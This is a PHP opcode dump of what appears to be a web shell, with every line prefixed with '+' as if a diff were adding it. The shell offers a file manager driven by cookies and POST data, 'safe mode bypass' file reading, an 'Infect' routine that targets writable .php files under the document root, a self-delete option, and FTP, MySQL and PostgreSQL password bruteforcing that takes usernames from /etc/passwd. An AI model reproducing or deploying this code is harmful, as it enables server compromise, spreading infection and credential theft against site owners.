+INIT_FCALL 'realpath'
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL 'chdir'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+INIT_METHOD_CALL 'close'
+DO_FCALL 
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'act'
+IS_EQUAL 'unzip'
+INIT_FCALL 'class_exists'
+SEND_VAL 'ZipArchive'
+DO_ICALL 
+NEW 'ZipArchive'
+DO_FCALL 
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'f'
+FE_RESET_R 
+FE_FETCH_R 
+INIT_METHOD_CALL 'open'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'c'
+DO_FCALL 
+INIT_METHOD_CALL 'extractTo'
+FETCH_FUNC_ARG 'GLOBALS'
+FETCH_DIM_FUNC_ARG 'cwd'
+DO_FCALL 
+INIT_METHOD_CALL 'close'
+DO_FCALL 
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'act'
+IS_EQUAL 'tar'
+INIT_FCALL 'chdir'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'c'
+DO_ICALL 
+INIT_FCALL 'array_map'
+SEND_VAL 'escapeshellarg'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'f'
+DO_ICALL 
+FETCH_W '_COOKIE'
+ASSIGN_DIM 'f'
+INIT_FCALL 'ex'
+INIT_FCALL 'escapeshellarg'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+DO_ICALL 
+CONCAT 'tar+cfzv+'
+CONCAT '+'
+INIT_FCALL 'implode'
+SEND_VAL '+'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'f'
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL 'chdir'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+FETCH_UNSET '_COOKIE'
+UNSET_DIM 'f'
+INIT_FCALL 'setcookie'
+SEND_VAL 'f'
+INIT_FCALL 'time'
+DO_ICALL 
+SUB 3600
+DO_ICALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'prototype'
+SEND_VAL 'act'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_FCALL 
+INIT_FCALL 'prototype'
+SEND_VAL 'f'
+INIT_FCALL 'serialize'
+FETCH_R '_POST'
+FETCH_DIM_R 'f'
+DO_ICALL 
+DO_FCALL 
+INIT_FCALL 'prototype'
+SEND_VAL 'c'
+FETCH_R '_POST'
+FETCH_DIM_R 'c'
+DO_FCALL 
+INIT_FCALL 'hardheader'
+DO_FCALL 
+ECHO '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>'
+INIT_FCALL 'hardscandir'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'c'
+FETCH_R '_POST'
+FETCH_DIM_R 'c'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_FCALL 
+ECHO 'Can't open this folder!'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+BIND_GLOBAL 'sort'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'preg_match'
+SEND_VAL '!s_([A-z]+)_(\d{1})!'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+CONCAT '<script>  function sa() {  for(i=0;i<d.files.elements.length;i++)  '
+CONCAT '")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_'
+CONCAT '")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify'
+CONCAT '")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g('
+CONCAT '")'>Permissions</a></th><th>Actions</th></tr>'
+INIT_FCALL 'posix_getpwuid'
+INIT_FCALL 'fileowner'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'posix_getgrgid'
+INIT_FCALL 'filegroup'
+DO_ICALL 
+DO_ICALL 
+INIT_ARRAY 'name'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+ADD_ARRAY_ELEMENT 'path'
+INIT_FCALL 'date'
+SEND_VAL 'Y-m-d H:i:s'
+INIT_FCALL 'filemtime'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+DO_ICALL 
+ADD_ARRAY_ELEMENT 'modify'
+INIT_FCALL 'viewpermscolor'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_FCALL 
+ADD_ARRAY_ELEMENT 'perms'
+INIT_FCALL 'filesize'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+ADD_ARRAY_ELEMENT 'size'
+FETCH_DIM_R 'name'
+FETCH_DIM_R 'name'
+INIT_FCALL 'fileowner'
+DO_ICALL 
+ADD_ARRAY_ELEMENT 'owner'
+FETCH_DIM_R 'name'
+FETCH_DIM_R 'name'
+INIT_FCALL 'filegroup'
+DO_ICALL 
+ADD_ARRAY_ELEMENT 'group'
+INIT_FCALL 'is_file'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+INIT_FCALL 'array_merge'
+DO_ICALL 
+INIT_FCALL 'is_link'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+INIT_FCALL 'array_merge'
+INIT_ARRAY 'link' 'type'
+INIT_FCALL 'readlink'
+FETCH_DIM_R 'path'
+DO_ICALL 
+ADD_ARRAY_ELEMENT 'link'
+DO_ICALL 
+INIT_FCALL 'is_dir'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+IS_NOT_EQUAL '.'
+INIT_FCALL 'array_merge'
+DO_ICALL 
+FETCH_W 'GLOBALS'
+ASSIGN_DIM 'sort'
+DECLARE_FUNCTION 'cmp'
+INIT_FCALL 'usort'
+SEND_VAL 'cmp'
+DO_ICALL 
+INIT_FCALL 'usort'
+SEND_VAL 'cmp'
+DO_ICALL 
+INIT_FCALL 'array_merge'
+DO_ICALL 
+FE_RESET_R 
+FE_FETCH_R 
+QM_ASSIGN ' class=l1'
+CONCAT '<tr'
+CONCAT '><td><input type=checkbox name="f[]" value="'
+INIT_FCALL 'urlencode'
+FETCH_DIM_R 'name'
+DO_ICALL 
+CONCAT '" class=chkbx></td><td><a href=# onclick="'
+FETCH_DIM_R 'type'
+IS_EQUAL 'file'
+INIT_FCALL 'urlencode'
+FETCH_DIM_R 'name'
+DO_ICALL 
+CONCAT 'g('FilesTools',null,''
+CONCAT '', 'view')">'
+INIT_FCALL 'htmlspecialchars'
+FETCH_DIM_R 'name'
+DO_ICALL 
+FETCH_DIM_R 'path'
+CONCAT 'g('FilesMan',''
+CONCAT '');" '
+ISSET_ISEMPTY_DIM_OBJ 'link'
+ROPE_INIT 'title=''
+FETCH_DIM_R 'link'
+ROPE_END '''
+CONCAT '><b>[ '
+INIT_FCALL 'htmlspecialchars'
+FETCH_DIM_R 'name'
+DO_ICALL 
+CONCAT ' ]</b>'
+CONCAT '</a></td><td>'
+FETCH_DIM_R 'type'
+IS_EQUAL 'file'
+INIT_FCALL 'viewsize'
+FETCH_DIM_R 'size'
+DO_FCALL 
+FETCH_DIM_R 'type'
+CONCAT '</td><td>'
+FETCH_DIM_R 'modify'
+CONCAT '</td><td>'
+FETCH_DIM_R 'owner'
+CONCAT '/'
+FETCH_DIM_R 'group'
+CONCAT '</td><td><a href=# onclick="g('FilesTools',null,''
+INIT_FCALL 'urlencode'
+FETCH_DIM_R 'name'
+DO_ICALL 
+CONCAT '','chmod')">'
+FETCH_DIM_R 'perms'
+CONCAT '</td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g('FilesToo'
+INIT_FCALL 'urlencode'
+FETCH_DIM_R 'name'
+DO_ICALL 
+CONCAT '', 'rename')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick'
+INIT_FCALL 'urlencode'
+FETCH_DIM_R 'name'
+DO_ICALL 
+CONCAT '', 'touch')">T</a>'
+FETCH_DIM_R 'type'
+IS_EQUAL 'file'
+INIT_FCALL 'urlencode'
+FETCH_DIM_R 'name'
+DO_ICALL 
+CONCAT ' <a class="tooltip" data-tooltip="Frame" href="#" onclick="g('FilesTools',null,''
+CONCAT '', 'frame')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick='
+INIT_FCALL 'urlencode'
+FETCH_DIM_R 'name'
+DO_ICALL 
+CONCAT '', 'edit')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick'
+INIT_FCALL 'urlencode'
+FETCH_DIM_R 'name'
+DO_ICALL 
+CONCAT '', 'download')">D</a>'
+CONCAT '</td></tr>'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+CONCAT '<tr id=fak><td colspan=7>  <input type=hidden name=ne value=''>  <input type'
+CONCAT ''>  <input type=hidden name=charset value=''
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'charset'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+CONCAT ''>  <label><select name='p1'>'
+FETCH_IS '_COOKIE'
+ISSET_ISEMPTY_DIM_OBJ 'act'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'f'
+ECHO '<option value='paste'>↳ Paste</option>'
+ECHO '<option value='copy'>Copy</option><option value='move'>Move</option><option value='
+INIT_FCALL 'class_exists'
+SEND_VAL 'ZipArchive'
+DO_ICALL 
+ECHO '<option value='zip'>+ zip</option><option value='unzip'>- zip</option>'
+ECHO '<option value='tar'>+ tar.gz</option>'
+ECHO '</select></label>'
+FETCH_IS '_COOKIE'
+ISSET_ISEMPTY_DIM_OBJ 'act'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'f'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'act'
+IS_EQUAL 'zip'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'act'
+IS_EQUAL 'tar'
+INIT_FCALL 'date'
+SEND_VAL 'Ymd_His'
+DO_ICALL 
+CONCAT '&nbsp;file name: <input type=text name=p2 value='hard_'
+CONCAT '.'
+FETCH_R '_COOKIE'
+FETCH_DIM_R 'act'
+IS_EQUAL 'zip'
+QM_ASSIGN 'zip'
+QM_ASSIGN 'tar.gz'
+CONCAT ''>&nbsp;'
+ECHO '<input type='submit' value='submit' style='margin-left:10px'></td></tr></form'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'substr'
+SEND_VAL '-1'
+DO_ICALL 
+IS_EQUAL '/'
+CONCAT '/'
+INIT_FCALL 'opendir'
+DO_ICALL 
+INIT_FCALL 'basename'
+DO_ICALL 
+IS_EQUAL '..'
+INIT_FCALL 'basename'
+DO_ICALL 
+IS_EQUAL '.'
+INIT_FCALL 'filetype'
+DO_ICALL 
+IS_EQUAL 'dir'
+INIT_FCALL_BY_NAME 'deleteDir'
+DO_FCALL 
+INIT_FCALL 'unlink'
+DO_ICALL 
+INIT_FCALL 'readdir'
+DO_ICALL 
+INIT_FCALL 'closedir'
+DO_ICALL 
+INIT_FCALL 'rmdir'
+DO_ICALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'is_dir'
+DO_ICALL 
+INIT_FCALL 'mkdir'
+DO_ICALL 
+INIT_FCALL 'opendir'
+DO_ICALL 
+IS_NOT_EQUAL '.'
+IS_NOT_EQUAL '..'
+INIT_FCALL_BY_NAME 'copy_paste'
+CONCAT '/'
+CONCAT '/'
+DO_FCALL 
+INIT_FCALL 'readdir'
+DO_ICALL 
+INIT_FCALL 'is_file'
+DO_ICALL 
+INIT_FCALL 'copy'
+DO_ICALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'is_dir'
+DO_ICALL 
+INIT_FCALL 'mkdir'
+DO_ICALL 
+INIT_FCALL 'opendir'
+DO_ICALL 
+IS_NOT_EQUAL '.'
+IS_NOT_EQUAL '..'
+INIT_FCALL_BY_NAME 'copy_paste'
+CONCAT '/'
+CONCAT '/'
+DO_FCALL 
+INIT_FCALL 'readdir'
+DO_ICALL 
+INIT_FCALL 'is_file'
+DO_ICALL 
+INIT_FCALL 'copy'
+DO_ICALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'sort'
+IS_NOT_EQUAL 'size'
+INIT_FCALL 'strcmp'
+INIT_FCALL 'strtolower'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'sort'
+DO_ICALL 
+INIT_FCALL 'strtolower'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'sort'
+DO_ICALL 
+DO_ICALL 
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'sort'
+QM_ASSIGN '-1'
+RETURN 
+FETCH_DIM_R 'size'
+FETCH_DIM_R 'size'
+QM_ASSIGN '-1'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'sort'
+QM_ASSIGN '-1'
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'function_exists'
+SEND_VAL 'hex2bin'
+DO_ICALL 
+DECLARE_FUNCTION 'hex2bin'
+INIT_FCALL 'function_exists'
+SEND_VAL 'binhex'
+DO_ICALL 
+DECLARE_FUNCTION 'binhex'
+INIT_FCALL 'function_exists'
+SEND_VAL 'hex2ascii'
+DO_ICALL 
+DECLARE_FUNCTION 'hex2ascii'
+INIT_FCALL 'function_exists'
+SEND_VAL 'ascii2hex'
+DO_ICALL 
+DECLARE_FUNCTION 'ascii2hex'
+INIT_FCALL 'function_exists'
+SEND_VAL 'full_urlencode'
+DO_ICALL 
+DECLARE_FUNCTION 'full_urlencode'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'ajax'
+INIT_FCALL 'prototype'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'ajax'
+DO_FCALL 
+INIT_FCALL 'ob_start'
+DO_ICALL 
+INIT_FCALL 'in_array'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+INIT_DYNAMIC_CALL 
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'p2'
+DO_FCALL 
+INIT_FCALL 'addcslashes'
+INIT_FCALL 'htmlspecialchars'
+INIT_FCALL 'ob_get_clean'
+DO_ICALL 
+DO_ICALL 
+SEND_VAL '  \''
+DO_ICALL 
+CONCAT 'document.getElementById('strOutput').style.display='';document.getElementById('strOutput').inne'
+CONCAT ''; '
+ECHO ' '
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'ajax'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'prototype'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'ajax'
+DO_FCALL 
+INIT_FCALL 'hardheader'
+DO_FCALL 
+ECHO '<h1>String conversions</h1><div class=content>'
+ECHO '<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this'
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+CONCAT '<option value=''
+CONCAT ''>'
+CONCAT '</option>'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+CONCAT 'ajax'
+FETCH_R '_COOKIE'
+QM_ASSIGN 'checked'
+CONCAT '</select></label><input type='submit' value='submit'/> <input type=checkbox name=aj'
+CONCAT '> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+DO_ICALL 
+CONCAT '</textarea></form><pre class='ml1' style=''
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+QM_ASSIGN 'display:none;'
+CONCAT 'margin-top:5px' id='strOutput'>'
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p1'
+INIT_FCALL 'in_array'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+DO_ICALL 
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+INIT_DYNAMIC_CALL 
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'p2'
+DO_FCALL 
+DO_ICALL 
+INIT_FCALL 'htmlspecialchars'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+CONCAT '</pre></div><br><h1>Search files:</h1><div class=content>  <form onsubmit'
+CONCAT '' style='width:100%'></td></tr>  <tr><td>Name:</td><td><in'
+DECLARE_FUNCTION 'hardrecursiveglob'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+INIT_FCALL_BY_NAME 'hardRecursiveGlob'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'c'
+DO_FCALL 
+ECHO '</div><br><h1>Search for hash:</h1><div class=content>  <form method='post'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'decbin'
+INIT_FCALL 'hexdec'
+DO_ICALL 
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'dechex'
+INIT_FCALL 'bindec'
+DO_ICALL 
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'chr'
+INIT_FCALL 'hexdec'
+ADD 1
+DO_ICALL 
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'sprintf'
+SEND_VAL 'X'
+INIT_FCALL 'ord'
+DO_ICALL 
+DO_ICALL 
+INIT_FCALL 'strtoupper'
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'dechex'
+INIT_FCALL 'ord'
+DO_ICALL 
+DO_ICALL 
+CONCAT '%'
+INIT_FCALL 'strtoupper'
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'substr'
+SEND_VAL '-1'
+DO_ICALL 
+IS_NOT_EQUAL '/'
+ASSIGN_OP '/'
+INIT_FCALL 'array_unique'
+INIT_FCALL 'array_merge'
+INIT_FCALL 'glob'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+DO_ICALL 
+INIT_FCALL 'glob'
+CONCAT '*'
+DO_ICALL 
+DO_ICALL 
+DO_ICALL 
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'is_dir'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'hardRecursiveGlob'
+DO_FCALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'p2'
+INIT_FCALL 'strpos'
+INIT_FCALL 'file_get_contents'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+DO_ICALL 
+INIT_FCALL 'urlencode'
+DO_ICALL 
+CONCAT '<a href='#' onclick='g("FilesTools",null,"'
+CONCAT '", "view","")'>'
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+CONCAT '</a><br>'
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'ob_start'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+SWITCH_LONG '[' '1:->19,' '2:->48,' '3:->64,' '4:->78,' '5:->88,' '6:->114,' ']'
+INIT_FCALL 'tempnam'
+SEND_VAL 'cx'
+DO_ICALL 
+INIT_FCALL 'copy'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT 'compress.zlib://'
+DO_ICALL 
+INIT_FCALL 'file_get_contents'
+DO_ICALL 
+INIT_FCALL 'unlink'
+DO_ICALL 
+ECHO 'Sorry... Can't open file'
+INIT_FCALL 'glob'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT '*'
+DO_ICALL 
+FE_RESET_R 
+FE_FETCH_R 
+CONCAT ' '
+INIT_FCALL_BY_NAME 'curl_init'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+CONCAT 'file://'
+CONCAT ''
+FETCH_CONSTANT 'SELF_PATH'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'curl_exec'
+DO_FCALL 
+INIT_FCALL 'ini_restore'
+SEND_VAL 'safe_mode'
+DO_ICALL 
+INIT_FCALL 'ini_restore'
+SEND_VAL 'open_basedir'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+INCLUDE_OR_EVAL 'INCLUDE'
+INIT_FCALL 'posix_getpwuid'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+DO_ICALL 
+INIT_FCALL 'join'
+SEND_VAL ':'
+DO_ICALL 
+CONCAT ' '
+FETCH_RW '_POST'
+FETCH_DIM_RW 'p2'
+FETCH_R '_POST'
+FETCH_DIM_R 'p2'
+FETCH_R '_POST'
+FETCH_DIM_R 'p3'
+INIT_FCALL 'function_exists'
+SEND_VAL 'imap_open'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'imap_open'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'p2'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'imap_body'
+DO_FCALL 
+INIT_FCALL_BY_NAME 'imap_close'
+DO_FCALL 
+INIT_FCALL 'ob_get_clean'
+DO_ICALL 
+INIT_FCALL 'hardheader'
+DO_FCALL 
+ECHO '<h1>Safe mode bypass</h1><div class=content>'
+ECHO '<span>Copy (read file)</span><form onsubmit='g(null,null,"1",this.param.value);retu'
+CONCAT '<pre class="ml1" style="margin-top:5px" id="Output">'
+CONCAT '</pre>'
+ECHO '</div>'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'setcookie'
+INIT_FCALL 'md5'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'HTTP_HOST'
+DO_ICALL 
+INIT_FCALL 'time'
+DO_ICALL 
+SUB 3600
+DO_ICALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_EQUAL 'yes'
+INIT_FCALL 'unlink'
+INIT_FCALL 'preg_replace'
+SEND_VAL '!\(\d+\)\s.*!'
+FETCH_CONSTANT '_FILE_'
+DO_ICALL 
+DO_ICALL 
+ECHO 'unlink error!'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_NOT_EQUAL 'yes'
+INIT_FCALL 'hardheader'
+DO_FCALL 
+ECHO '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick='
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'hardheader'
+DO_FCALL 
+ECHO '<h1>Infect</h1><div class=content>'
+FETCH_R '_POST'
+FETCH_DIM_R 'p1'
+IS_EQUAL 'infect'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'DOCUMENT_ROOT'
+DECLARE_FUNCTION 'listfiles'
+INIT_FCALL_BY_NAME 'ListFiles'
+DO_FCALL 
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'substr'
+SEND_VAL '-4'
+DO_ICALL 
+IS_EQUAL '.php'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'DOCUMENT_ROOT'
+FETCH_R '_SERVER'
+FETCH_DIM_R 'PHP_SELF'
+INIT_FCALL 'is_writeable'
+DO_ICALL 
+FAST_CONCAT '<br>'
+ROPE_INIT '<font color=#a10705 size=14>'
+ROPE_END '</font>'
+ECHO '<form method=post><input type=submit value=Infect name=infet></form>'
+ECHO 'Really want to infect the server?&nbsp;<a href=# onclick="g(null,null,'infect')">Yes<'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'opendir'
+DO_ICALL 
+IS_NOT_EQUAL '.'
+IS_NOT_EQUAL '..'
+INIT_FCALL 'is_dir'
+CONCAT '/'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'ListFiles'
+CONCAT '/'
+DO_FCALL 
+INIT_FCALL 'array_merge'
+DO_ICALL 
+INIT_FCALL 'array_push'
+CONCAT '/'
+DO_ICALL 
+INIT_FCALL 'readdir'
+DO_ICALL 
+INIT_FCALL 'closedir'
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'hardheader'
+DO_FCALL 
+FETCH_IS '_POST'
+ISSET_ISEMPTY_DIM_OBJ 'proto'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'proto'
+DO_ICALL 
+CONCAT '<h1>Results</h1><div class=content><span>Type:</span> '
+CONCAT ' <span>Server:</span> '
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'server'
+DO_ICALL 
+CONCAT '<br>'
+FETCH_R '_POST'
+FETCH_DIM_R 'proto'
+IS_EQUAL 'ftp'
+DECLARE_FUNCTION 'bruteforce'
+FETCH_R '_POST'
+FETCH_DIM_R 'proto'
+IS_EQUAL 'mysql'
+DECLARE_FUNCTION 'bruteforce'
+FETCH_R '_POST'
+FETCH_DIM_R 'proto'
+IS_EQUAL 'pgsql'
+DECLARE_FUNCTION 'bruteforce'
+INIT_FCALL 'explode'
+SEND_VAL ':'
+FETCH_R '_POST'
+FETCH_DIM_R 'server'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'type'
+INIT_FCALL 'file'
+SEND_VAL '/etc/passwd'
+DO_ICALL 
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'explode'
+SEND_VAL ':'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'bruteForce'
+DO_FCALL 
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+CONCAT '<b>'
+CONCAT '</b>:'
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+CONCAT '<br>'
+FETCH_R '_POST'
+FETCH_DIM_R 'reverse'
+SUB 1
+INIT_FCALL_BY_NAME 'bruteForce'
+DO_FCALL 
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+CONCAT '<b>'
+CONCAT '</b>:'
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+FETCH_R '_POST'
+FETCH_DIM_R 'type'
+INIT_FCALL 'file'
+FETCH_R '_POST'
+FETCH_DIM_R 'dict'
+DO_ICALL 
+FE_RESET_R 
+FE_FETCH_R 
+INIT_FCALL 'trim'
+DO_ICALL 
+INIT_FCALL_BY_NAME 'bruteForce'
+FETCH_FUNC_ARG '_POST'
+FETCH_DIM_FUNC_ARG 'login'
+DO_FCALL 
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'login'
+DO_ICALL 
+CONCAT '<b>'
+CONCAT '</b>:'
+INIT_FCALL 'htmlspecialchars'
+DO_ICALL 
+CONCAT '<br>'
+ROPE_INIT '<span>Attempts:</span> '
+ROPE_ADD ' <span>Success:</span> '
+ROPE_END '</div><br>'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+CONCAT '<h1>FTP bruteforce</h1><div class=content><table><form method=post><tr><td><span>'
+CONCAT '">'
+CONCAT '<input type=hidden name=a value="'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'a'
+DO_ICALL 
+CONCAT '">'
+CONCAT '<input type=hidden name=charset value="'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R '_POST'
+FETCH_DIM_R 'charset'
+DO_ICALL 
+CONCAT '">'
+CONCAT '<input type=hidden name=ne value="">'
+CONCAT '<span>Server:port</span></td>'
+CONCAT '<td><input type=text name=server value="127.0.0.1"></td></tr>'
+CONCAT '<tr><td><span>Brute type</span></td>'
+CONCAT '<td><input type=radio name=type value="1" checked> /etc/passwd</td></tr>'
+CONCAT '<tr><td></td><td style="padding-left:15px"><input type=checkbox name=reverse value=1 '
+CONCAT '<tr><td></td><td><input type=radio name=type value="2"> Dictionary</td></tr'
+CONCAT '<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</sp'
+CONCAT '<td><input type=text name=login value="root"></td></tr>'
+CONCAT '<tr><td><span>Dictionary</span></td>'
+CONCAT '<td><input type=text name=dict value="'
+INIT_FCALL 'htmlspecialchars'
+FETCH_R 'GLOBALS'
+FETCH_DIM_R 'cwd'
+DO_ICALL 
+CONCAT 'passwd.dic"></td></tr></table>'
+CONCAT '</td></tr><tr><td></td><td><input type=submit value="submit"></td><'
+ECHO '</div>'
+INIT_FCALL 'hardfooter'
+DO_FCALL 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
+INIT_FCALL 'ftp_connect'
+DO_ICALL 
+RETURN 
+INIT_FCALL 'ftp_login'
+DO_ICALL 
+INIT_FCALL 'ftp_close'
+DO_ICALL 
+RETURN 
+RETURN 'null'
+FunctionEnd 
+FunctionStart 
